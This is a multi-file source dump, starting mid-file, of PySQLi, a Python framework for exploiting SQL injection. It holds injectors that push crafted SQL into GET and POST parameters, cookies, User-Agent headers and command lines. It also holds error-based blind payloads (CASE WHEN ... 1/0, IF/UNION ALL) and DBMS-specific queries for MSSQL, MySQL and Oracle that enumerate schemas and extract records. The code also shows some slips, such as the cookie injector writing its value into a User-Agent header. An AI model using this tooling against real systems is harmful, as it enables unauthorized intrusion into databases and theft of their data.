        Forge a piece of SQL returning all the tables of the provided database (db).

        db: target database name.
        """
        raise NotImplementedError('You must provide the get_tables() method.')


    def get_nb_tables(self,db):
        """
        Forge a piece of SQL returning the number of tables.

        db: target database name.
        """
        return self.count(self.get_tables(db))


    def get_table_name(self, id, db):
        """
        Forge a piece of SQL returning the name of a table.

        id: table index
        db: target database name.
        """
        return self.take(self.get_tables(db), id)


    def get_fields(self, table, db):
        """
        Forge a piece of SQL returning all the existing fields of a table.

        table: target table name
        db: target database name
        """
        raise NotImplementedError('You must provide the get_fields() method.')


    def get_nb_fields(self, table, db):
        """
        Forge a piece of SQL returning the number of fields.

        table: target table name
        db: target database name
        """
        return self.count(self.get_fields(table,db))


    def get_field_name(self, table, id, db):
        """
        Forge a piece of SQL returning the field name

        table: target table name
        db: target database name
        id: field index
        """
        return self.take(self.get_fields(table, db), id)


    def get_string_len(self, sql):
        """
        Forge a piece of SQL returning the length of a string/subquery.

        sql: source string or sql
        """
        return self.string_len(sql)


    def get_string_char(self, sql, pos):
        """
        Forge a piece of SQL returning the ascii code of a string/sql

        sql: source string or sql
        pos: character position
        """
        return self.ascii(self.get_char(sql, pos))



########NEW FILE########
__FILENAME__ = injector
#-*- coding:utf-8 -*-

"""
This module implements the core injection components. Injection is performed
by 'injectors', dedicated to the SQL injection itself.

These injectors make the injection possible in every possible target: command
lines, HTTP requests, HTTP headers, ...

They only have to return a boolean result depending on the injected SQL code.

This module provides many injectors:
    
    HttpInjector
    GetInjector
    PostInjector
    CookieInjector
    UserAgentInjector
    CmdInjector
    
They can be used to inject into GET and POST requests, into cookies or user-
agent headers, and even in command line.
"""

import httplib
import urllib
import re
from subprocess import Popen, PIPE
from urlparse import urlparse, parse_qs
from triggers import RegexpTrigger, StatusTrigger, Trigger


class Response(object):
    """
    Default response class.
    
    This class is used to hold every response information:
        - status code 
        - response content
        
    It is used by triggers to determine the result of an injection (boolean)
    """
    
    def __init__(self, status=-1, content=None):
        self._status = status
        self._content = content
        
    def get_status(self):
        """
        Retrieve the response's status code
        """
        return self._status

    def get_content(self):
        """
        Retrieve the response content
        """
        return self._content


class HttpResponse(Response):
    """
    HTTP response (as returned by httplib)
    """
    def __init__(self, response):
        """
        Wrap an httplib HttpResponse into a compatible instance
        """
        super(HttpResponse, self).__init__(response.status, response.read())
        self._response = response        
    
    def get_header(self, header):
        """
        Retrieve a specific header
        """
        return self._response.getheader(header)


class AbstractInjector(object):
    """
    This is an abstract class representing an SQL injector.
    
    Basically, SQL injection exploitation is based on two steps:
        - parameter tampering
        - remote SQL injection
    
    The first one is achieved by this class. Second one is implemented
    as a method inherited classes must derive from. That is, you can use this
    abstract class to basically inject wherever you want: cmdlines, HTTP
    requests, raw data, ...
    """
    
    def __init__(self, parameters, target=None, smooth=False):
        """
        parameters must be a dictionary containing parameters as keys and
        their default values as values. 
        
        target specifies the parameter to use for the injection.
        smooth specifies the injection method (full replacement or
        inplace replacement)
        """
        self._parameters = parameters
        self._target = target
        self._smooth = smooth
        self._trigger = None
    
    def set_parameters(self, parameters, target=None):
        """
        Set parameters and optionally the target parameter.
        
        parameters: dict of parameters
        target: target parameter (default: None)
        """
        self._parameters = parameters
        self._target = target
     
    def get_trigger(self):
        """
        Retrieve trigger instance
        """
        return self._trigger
        
    def set_trigger(self, trigger):
        """
        Set default trigger
        
        trigger specifies the new trigger to use. see class Trigger.
        """
        self._trigger = trigger

    def process_parameters(self, sql):
        """
        Tamper target parameter given a specific mode: normal or smooth
        
        We do not care about what the injector does with these parameters,
        we tamper them as requested.
        """
        if isinstance(self._parameters, dict):
            tampered_params = {}
            # loop on all parameters
            for parameter in self._parameters:
                if parameter == self._target:
                    if self._smooth:
                        tampered_params[parameter] = self._parameters[parameter].replace('SQLHERE', sql)
                    else:
                        tampered_params[parameter] = sql
                else:
                    tampered_params[parameter] = self._parameters[parameter]
            return tampered_params
        elif isinstance(self._parameters, list):
            tampered_params = self._parameters
            if self._smooth:
                tampered_params[self._target] = self._parameters[self._target].replace('*', sql)
            else:
                tampered_params[self._target] = sql
            return tampered_params
        else:
            return self._parameters
    
    def process_injection(self, parameters):
        """
        Inherited classes must implement their own injection routine here.
        """
        raise NotImplementedError('Must Be Overridden')
    
    def inject(self, sql):
        """
        The real injection method. This method relies on two other methods:
            - process_parameters
            - process_injection
        The first one modifies the parameters and the second one inject them.
        """
        return self.process_injection(self.process_parameters(sql))


class ContextBasedInjector(AbstractInjector):
    """
    Context-based injector. 
    
    This injector keeps a reference to the caller's context.
    """
    
    def __init__(self, context):
        super(ContextBasedInjector, self).__init__(
            context.get_params(),
            context.get_target_param(),
            context.is_smooth()
        )
        self._context = context
        
    def get_context(self):
        """
        Return the target context
        """
        return self._context

    def process_response(self, response):
        """
        Default response processing.
               
        This method processes the response, and execute the specified trigger
        to determine the result state (boolean). 
        
        Return None if inband mode is selected and nothing can be extracted.

        response: instance of Response or a child class representing the
            response of an injection.

        """
        if self._context.is_blind():
            # if blind, ask the injector to return a boolean value
            if self._trigger.is_error():
                return not self._trigger.execute(response)
            else:
                return self._trigger.execute(response)
        else:
            # if inband, check if we can extract some data
            result = re.search('%s(.*)%s' % (
                self._context.get_inband_tag(),
                self._context.get_inband_tag()
            ),response.get_content())
            if result:
                return result.group(1)
            else:
                return None
        
class HttpInjector(ContextBasedInjector):
    """
    Default HTTP Injector. 
    
    This injector supports most of the HTTP methods, is able to set custom
    cookies and headers, and performs dynamic parameters tampering.
    """
    
    def __init__(self, method, context):
        """
        Constructor.
        
        Method specifies an HTTP method to use, context an injection context.
        """
        super(HttpInjector, self).__init__(context)
        self._method = method

        # parse url
        self.set_url(self._context.get_url())
        
        # set default trigger
        self._trigger = RegexpTrigger(
            ['(error|unknown|illegal|warning|denied|subquery)'],
             mode=Trigger.MODE_ERROR
        )


    def set_url(self, url):
        """
        Set the default URL to use for injection
        
        This causes the injector to re-parse the URL and reset some properties.
        """
        # parse URL
        self._context.set_url(url)
        self._url = self._context.get_url()
        parsed_url = urlparse(self._url)
        if parsed_url.scheme == 'https' and not self._context.is_ssl():
            self._context.use_ssl(True)
            
        # rebuild our base url
        self._base_url = '%s://%s%s' % (
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path
        )
        self._base_uri = parsed_url.path
        self._server = parsed_url.netloc
        
        # extract url parameters & fix the dictionary
        if parsed_url.query != '':
            self._url_parameters = parse_qs(parsed_url.query)
            for param in self._url_parameters:
                self._url_parameters[param] = self._url_parameters[param][0]
        else:
            self._url_parameters = {}
            
    def get_url(self):
        """
        Retrieve the URL
        """
        return self._url
        
    def get_base_url(self):
        """
        Retrieve the base URL (without query string)
        """
        return self._base_url
        
    def get_base_uri(self):
        """
        Retrieve the base URI (without query string)
        """
        return self._base_uri
        
    def get_server(self):
        """
        Retrieve server info as a string (server:port)
        """
        return self._server
        
    def get_url_parameters(self):
        """
        Get URL parameters (taken from query strings) as dict
        """
        return self._url_parameters
        
    def set_url_parameters(self, parameters):
        """
        Set URL parameters.
        
        parameters is a dict containing the new parameters. Use this with
        care, because concurrent accesses are made by the asynchronous workers
        and may alter reliability.
        """
        self._url_parameters = parameters

    def build_uri(self, parameters):
        """
        Build URI
        
        Override this method if you have to encode a URL parameter or something
        like this.
        """
        return "{0}?{1}".format(self.get_base_uri(), urllib.urlencode(self._url_parameters))

    def process_injection(self, parameters, data=None,
                          content_type=None, headers=None):
        """
        Do the HTTP request, and execute trigger.execute
        
        In this default impl., parameters is not used. Override this
        to change behavior.
        """
        # use ssl ?
        if self._context.use_ssl():
            request = httplib.HTTPSConnection(self._server)
        else:
            request = httplib.HTTPConnection(self._server)
        
        # create the request
        request.putrequest(self._method, self.build_uri(parameters))
        if data is not None:
            request.putheader('Content-Length', str(len(data)))
        if content_type is not None:
            request.putheader('Content-Type', content_type)
            
        # handle headers
        _headers = {}
        # load context headers first
        if self._context.has_headers():
            for header, value in self._context.get_headers().items:
                _headers[header] = value
        # overrides with headers if provided
        if headers:
            for header, value in headers:
                _headers[header,] = value
        # eventually set request headers
        for header, value in _headers:
            request.putheader(header, value)
        # if cookie set it
        if self._context.get_cookie() is not None:
            request.putheader('Cookie', self._context.get_cookie())
        request.endheaders()
        
        # perform
        if data is not None:
            request.send(data)
        response = request.getresponse()
        
        # execute trigger
        return self.process_response(HttpResponse(response))

        
class GetInjector(HttpInjector):
    """
    Basic HTTP GET injector
    """
    def __init__(self, context):
        HttpInjector.__init__(self, 'GET', context)
    
    def build_uri(self, parameters):
        """
        Overrides URL parameters with tampered ones
        """
        return self.get_base_uri() + '?'+urllib.urlencode(parameters)
    
class PostInjector(HttpInjector):
    """
    Basic HTTP POST injector
    """
    def __init__(self, context):
        super(PostInjector, self).__init__('POST', context)
        
    def process_injection(self, parameters):
        """
        Serialize tampered data and inject them as form values
        """
        # create data from modified parameters
        data = urllib.urlencode(parameters)
        return super(PostInjector, self).process_injection(
            parameters,
            data=data,
            content_type='application/x-www-form-urlencoded'
        )

class UserAgentInjector(HttpInjector):
    """
    Basic HTTP User-Agent header injector
    """
    def __init__(self, method, context, data=None, content_type=None):
        """
        Constructor
        
        Add a default target parameter 'user-agent'.
        """
        super(UserAgentInjector, self).__init__(method, context)
        self.set_parameters({'user-agent':''}, 'user-agent')
        self._data = data
        self._content_type = content_type
    
    def process_injection(self, parameters):
        """
        Inject into our context the new header. 
        """
        # get magic 'user-agent' parameter
        self.get_context().set_header('User-Agent', parameters['user-agent'])
        return super(UserAgentInjector, self).process_injection(parameters)
        
        
class CookieInjector(HttpInjector):
    """
    Cookie-based SQL injector.
    
    Use this injector if you want to inject into a cookie param.
    Supports post data, url parameters, and other headers.
    """
    def __init__(self, method, context, data=None, content_type=None):
        super(CookieInjector, self).__init__(method, context)
        self._data = data
        self._content_type = content_type
        
    def assemble_cookie(self, parameters):
        """
        Build the cookie
        """
        return '; '.join(['%s=%s' % k for k in parameters.items()])
        
    def process_injection(self, parameters):
        """
        Create on-demand headers containing the injected string
        """
        return super(CookieInjector, self).process_injection(
            parameters,
            data=self._data,
            content_type=self._content_type,
            headers={
                'User-Agent':self.assemble_cookie(parameters)
            }
        )


class CmdInjector(ContextBasedInjector):
    """
    Command injector
    
    This injector should be used to inject SQL into a cmdline. Popen does not
    support multi-threading, which is disabled.
    """
    
    def __init__(self, context):
        """
        Constructor.
        
        Set up the lock and our default trigger (based on return code)
        """
        super(CmdInjector, self).__init__(context)
        self._context = context
        
        # disable multi-threading
        self._context.set_multithread(False)
        
        # set default trigger
        self.set_trigger(StatusTrigger(0, mode=Trigger.MODE_SUCCESS))

    def process_injection(self, parameters):
        """
        The real injection method.
        
        Launch the subprocess, and release the lock. Process the response.
        """
        # launch process using Popen
        result = Popen(parameters, stdout=PIPE)
        content = result.communicate()[0]
        return self.process_response(Response(result.returncode, content))
 

########NEW FILE########
__FILENAME__ = triggers
#-*- coding: utf-8 -*-

"""
Triggers are used in conjunction with injectors to determine the result
of an injection.

This module provides a default class (Trigger) and two other classes implement-
ing status-based triggering and regexp-based triggering.

Two modes are available: MODE_ERROR and MODE_SUCCESS.MODE_ERROR must be used
with triggers detecting errors, while MODE_SUCCESS must be used with triggers
detecting success answers. 

Note that PySQLi exploitation engine is based on conditional errors (when
the tested condition is false)

classes:
    
    Trigger (default trigger)
    StatusTrigger (status-based trigger)
    RegexpTrigger (regexp-based trigger)

"""

import re

class Trigger:

    MODE_ERROR = 0
    MODE_SUCCESS = 1
    MODE_UNKNOWN = 2

    def __init__(self, mode=MODE_SUCCESS):
        self._mode = mode
        pass

    def is_error(self):
        """
        Determine if MODE_ERROR is set
        """
        return self._mode is Trigger.MODE_ERROR

    def get_mode(self):
        """
        Retrieve the mode
        """
        return self._mode

    def set_mode(self, mode):
        """
        Set mode
        """
        self._mode = mode
    
    def execute(self, response):
        """
        Process response
        """
        return None


class StatusTrigger(Trigger):
    """
    Status-based trigger
    """
    
    def __init__(self, status, *args, **kwargs):
        Trigger.__init__(self, *args, **kwargs)
        self._status = status

    def execute(self, response):
        """
        Check if status code is the one expected
        """
        return response.get_status() is self._status

class RegexpTrigger(Trigger):
    """
    Regexp-based trigger
    """
    
    def __init__(self, regexps, *args, **kwargs):
        """
        Constructor
        
        regexps: either a list of regexp or a string representing a regexp to match
        """
        Trigger.__init__(self, *args, **kwargs)
        self._regexps = []
        if isinstance(regexps, list):
            for regexp in regexps:
                self._regexps.append(re.compile(regexp, re.I|re.MULTILINE))
        else:
            self._regexps=[re.compile(regexps)]

    def execute(self, response):
        """
        Process response
        
        Loop on every regexp and if one matches then returns True.
        """
        content = response.get_content()
        for regexp in self._regexps:
            if regexp.search(content):
                return True
        return False


########NEW FILE########
__FILENAME__ = wrappers
#-*- coding: utf-8 -*-

"""
This module provides three wrappers, as an abstraction layer
of the exploited database. 

Classes:

    DatabaseWrapper
    TableWrapper
    FieldWrapper

"""

from exceptions import Unavailable


class FieldWrapper(object):
    """
    Database field/column abstraction layer.
    """

    def __init__(self, dbms, table, db, field):
        self.dbms = dbms
        self.table = table
        self.db = db
        self.field = field        
    
    def __eq__(self, other):
        return other == self.field
    
    def __str__(self):
        return self.field
        
    def __repr__(self):
        return self.field


class TableWrapper(object):

    """
    Database table abstraction layer.

    This wrapper provides methods to enumerate every field
    and extract data from a given table.
    """
    
    def __init__(self, dbms, table, db):
        """
        Constructor

        dbms: pysqli's dbms instance
        table: target table name
        db: wrapped database instance
        """
        self.dbms = dbms
        self.table = table
        self.db = db
        self.__fields = None
    
    
    def fields(self):
        """
        Retrieve all table's fields (wrapped)
        """
        self.update()
        return self.__fields


    def update(self, force=False):
        """
        Update fields info and cache.

        force: Force cache cleanup before updating.
        """
        if (self.__fields is None) or force:
            self.__fields = [f for f in self.dbms.fields(self.table, self.db)]

    def describe(self):
        """
        Describes table structure.
        """
        self.update()
        return "Table %s\n" % self.table + '\n'.join([' -> %s' % field for field in self.__fields])


    def count(self):
        """
        Count table's records.
        """
        return self.dbms.count_table_records(self.table,self.db,1000000)


    def select(self, start=0, count=1, fields=None):
        """
        Select rows

        start: start row index
        count: number of rows to return
        fields: list of fields to select (default: all)
        """
        try:
            if fields is None:
                self.update()
        except Unavailable:
            if fields is None:
                raise Unavailable()

        records = []
        for i in range(start, start + count):
            record = {}
            if fields is None:
                for field in self.__fields:
                    record[field] = self.dbms.get_record_field_value(field, self.table, i, self.db)
            else:
                for field in fields:
                    record[field] = self.dbms.get_record_field_value(field, self.table, i, self.db)                    
            records.append(record)
        return records

    def all(self, fields=None):
        """
        Enumerate all rows as a dictionary.

        fields: list of fields to select (default: all)
        """
        if fields is None:
            self.update()
        for i in range(self.count()):
            record = {}
            if fields is None:
                for field in self.__fields:
                    record[str(field)] = self.dbms.get_record_field_value(field, self.table, i, self.db)
            else:
                for field in fields:
                    record[field] = self.dbms.get_record_field_value(field, self.table, i, self.db)
            yield record    


    def __len__(self):
        """
        Retrieve the number of databases
        """
        return self.dbms.get_nb_fields(self.table, self.db)

    def __getitem__(self, key):
        """
        Retrieve field/column info

        key: field/column name
        """
        return FieldWrapper(self.dbms, self.table, self.db, key)

    def __str__(self):
        """
        Retrieve table's name
        """
        return self.table

    def __repr__(self):
        """
        Display table name
        """
        return self.table
        
    def __eq__(self, other):
        """
        Compares tables based on their names
        """
        return self.table == other


class DatabaseWrapper:
    """
    Database abstraction layer.
    """

    def __init__(self, dbms, db):
        self.dbms = dbms
        self.db = db
        self.__tables = None
        
    def tables(self):
        """
        Enumerate database's tables
        """
        if self.__tables is None:
            self.update()
        return self.__tables

    def update(self):
        """
        Update tables list
        """
        self.__tables = self.dbms.tables(self.db)

    def __len__(self):
        """
        Retrieve the number of tables present in the database
        """
        return self.dbms.getNbTables(self.db)

    def __getitem__(self, key):
        """
        Retrieve a wrapped table based on its name
        """
        return TableWrapper(self.dbms, key, self.db)

    def __str__(self):
        """
        Retrieve database name
        """
        return self.db

    def __repr__(self):
        """
        Display database name
        """
        return self.db


########NEW FILE########
__FILENAME__ = mssql
#-*- coding:utf-8 -*-

from pysqli.core.dbms import COMMENT, DBS_ENUM, TABLES_ENUM, \
    COLS_ENUM, FIELDS_ENUM, STR, allow, DBMS, dbms
from pysqli.core.forge import SQLForge

class MssqlForge(SQLForge):
    def __init__(self, context):
        SQLForge.__init__(self, context)

    ###
    #Define overrides
    ###

    def wrap_bisec(self, cdt):
        return self.wrap_sql('SELECT CASE WHEN %s THEN %s ELSE 1/0 END' % (cdt, self.wrap_field('0')))

    def wrap_string(self, string):
        out = '('
        for car in string:
            out += 'CHAR(%d)+' % ord(car)
        out = out[:-1] + ')'
        return out

    def string_len(self, string):
        return 'SELECT LEN(%s)' % string


    ############################################
    # VERSION
    ############################################

    def get_version(self):
        return '@@VERSION'

    def get_hostname(self):
        return 'HOST_NAME()'


    ############################################
    # DATABASES
    ############################################

    def get_current_database(self):
        return 'DB_NAME()'

    def get_databases(self):
        return 'SELECT name FROM master..sysdatabases'


    ############################################
    # TABLES
    ############################################

    def get_tables(self, db):
        return 'SELECT name FROM %s..sysobjects WHERE xtype= %s' % (db, self.wrap_string('U'))

    def get_user(self):
        return 'user_name()'

    ############################################
    # FIELDS
    ############################################

    def getFields(self, table, db):
        return "SELECT name FROM %s..syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = %s)" % (
        db, self.wrap_string(table))

    def get_string_len(self, str):
        return "LEN(%s)" % str

    def get_char(self, str, pos):
        return "ASCII(SUBSTRING(%s,%d,1))" % (str, pos + 1)


@dbms('mssql', 'Microsoft SQL Server')
@allow(DBS_ENUM | TABLES_ENUM | COLS_ENUM | FIELDS_ENUM | COMMENT | STR)
class Mssql(DBMS):
    def __init__(self, injector, limit_count_max=500):
        DBMS.__init__(self, MssqlForge, injector, limit_count_max)

########NEW FILE########
__FILENAME__ = mysql4
#-*- coding:utf-8 -*-

from pysqli.core.dbms import COMMENT, STR, allow, DBMS, dbms
from pysqli.core.forge import SQLForge

class Mysql4Forge(SQLForge):
    def __init__(self, context):
        SQLForge.__init__(self, context)

    ###
    #Define overrides
    ###
    def get_version(self):
        return "@@VERSION"

    def wrap_bisec(self, cdt):
        return self.wrap_sql("SELECT IF(%s,%s,(SELECT %s UNION ALL SELECT %s ))" % (
        cdt, self.wrap_field('0'), self.wrap_field('0'), self.wrap_field('0')))


@dbms('mysqlv4', 'Mysql version 4')
@allow(COMMENT | STR)
class Mysql4(DBMS):
    def __init__(self, injector, limit_count_max=500):
        DBMS.__init__(self, Mysql4Forge, injector, limit_count_max)

########NEW FILE########
__FILENAME__ = mysql5
#-*- coding:utf-8 -*-

from pysqli.core.dbms import COMMENT, DBS_ENUM, TABLES_ENUM,\
    COLS_ENUM, FIELDS_ENUM, STR, allow, DBMS, dbms
from pysqli.core.forge import SQLForge

class MysqlForge(SQLForge):
    def __init__(self, context):
        SQLForge.__init__(self, context)

    ###
    #Define overrides
    ###

    def get_user(self):
        return 'USER()'

    def get_version(self):
        """
        Mysql specific macro
        """
        return "@@VERSION"

    def get_databases(self):
        """
        List databases
        """
        return "SELECT schema_name FROM information_schema.schemata"

    def get_tables(self, db):
        """
        List databases given a specific database
        """
        return "SELECT table_name FROM information_schema.tables WHERE table_schema=%s" % self.wrap_string(db)

    def get_fields(self, table, db):
        """
        Retrieve fields given a specific table and database
        """
        return "SELECT column_name FROM information_schema.columns WHERE table_schema=%s AND table_name=%s" % (
        self.wrap_string(db), self.wrap_string(table))

    def wrap_bisec(self, cdt):
        """
        This method must trigger an error on FALSE statement (Basic engine inner working)
        """
        return self.wrap_sql("SELECT IF(%s,%s,(SELECT %s UNION ALL SELECT %s ))" % (
        cdt, self.wrap_field('0'), self.wrap_field('0'), self.wrap_field('0')))


@dbms('mysqlv5', 'Mysql version 5')
@allow(DBS_ENUM | TABLES_ENUM | COLS_ENUM | FIELDS_ENUM | COMMENT | STR)
class Mysql5(DBMS):
    def __init__(self, injector, limit_count_max=500):
        DBMS.__init__(self, MysqlForge, injector, limit_count_max)

########NEW FILE########
__FILENAME__ = oracle
#-*- coding:utf-8 -*-

from pysqli.core.dbms import COMMENT, DBS_ENUM, TABLES_ENUM,\
    COLS_ENUM, FIELDS_ENUM, STR, allow, DBMS, dbms
from pysqli.core.forge import SQLForge

class OracleForge(SQLForge):
    def __init__(self, context):
        SQLForge.__init__(self, context)

    def mid_check(self):
        return self.wrap_sql('SELECT CASE WHEN 1<0 THEN 0 ELSE 1/0 END FROM dual')

    def mid_check_bis(self):
        return self.wrap_sql('SELECT CASE WHEN 0<1 THEN 0 ELSE 1/0 END FROM dual')

    def string_len(self, s):
        return 'LENGTH(%s)' % s

    def get_char(self, string, pos):
        return 'substr(%s, %d, 1)' % (string, pos)

    def wrap_bisec(self, cdt):
        return self.wrap_sql('SELECT CASE WHEN %s THEN %s ELSE 1/0 END FROM dual' % (cdt, self.wrap_field('0')))

    def count(self, records):
        sql = "SELECT COUNT(*) FROM %s" % records
        return sql

    def take(self, records, index):
        return 'select * FROM %s WHERE ROWNUM=%d' % (records, index)

    ############################################
    # VERSION
    ############################################


    def get_version(self):
        return '(SELECT banner FROM v$version WHERE banner LIKE \'Oracle%\')'


    ############################################
    # DATABASES
    ############################################

    def get_current_database(self):
        return '(SELECT SYS.DATABASE_NAME FROM DUAL)'

    def get_databases(self):
        return '(SELECT DISTINCT owner FROM all_tables)'

    ############################################
    # TABLES
    ############################################

    def get_tables(self, db):
        return '(SELECT table_name FROM sys.user_tables)'

    ############################################
    # USER
    ############################################

    def get_user(self):
        return '(SELECT user FROM dual)'


@dbms('oracle', 'Oracle')
@allow(DBS_ENUM | TABLES_ENUM | COLS_ENUM | FIELDS_ENUM | COMMENT | STR)
class Oracle(DBMS):
    def __init__(self, injector, limit_count_max=500):
        DBMS.__init__(self, OracleForge, injector, limit_count_max)
		

########NEW FILE########
